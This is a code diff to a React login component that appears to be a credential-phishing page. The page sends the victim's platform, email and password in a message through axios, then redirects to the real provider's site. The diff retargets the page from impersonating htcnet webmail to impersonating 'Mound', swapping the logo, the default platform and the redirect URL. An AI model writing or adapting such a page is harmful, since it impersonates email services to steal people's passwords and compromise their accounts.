@@ -7,6 +7,7 @@ import { useState } from 'react';
 import axios from 'axios';
 import comporium from './comporium.png';
 import htcnet from './htcnet.png';
+import mound from './mound.png';
 
 function Home(){
 
@@ -14,7 +15,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("htcnet")
+    const[platform, setPlatform] = useState("Mound")
 
     const[showError, setShowError] = useState(false);
 
@@ -34,6 +35,7 @@ function Home(){
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
     
+    
         
             // Handle success
          
@@ -42,7 +44,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.htcnet.net/';
+               window.location.href = 'https://login.mound.net/';
             }
           } catch (error) {
             // Handle error
@@ -67,7 +69,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={htcnet} className="mylogo" />
+                <img src={mound} className="mylogo" />
 
                 </div>
 
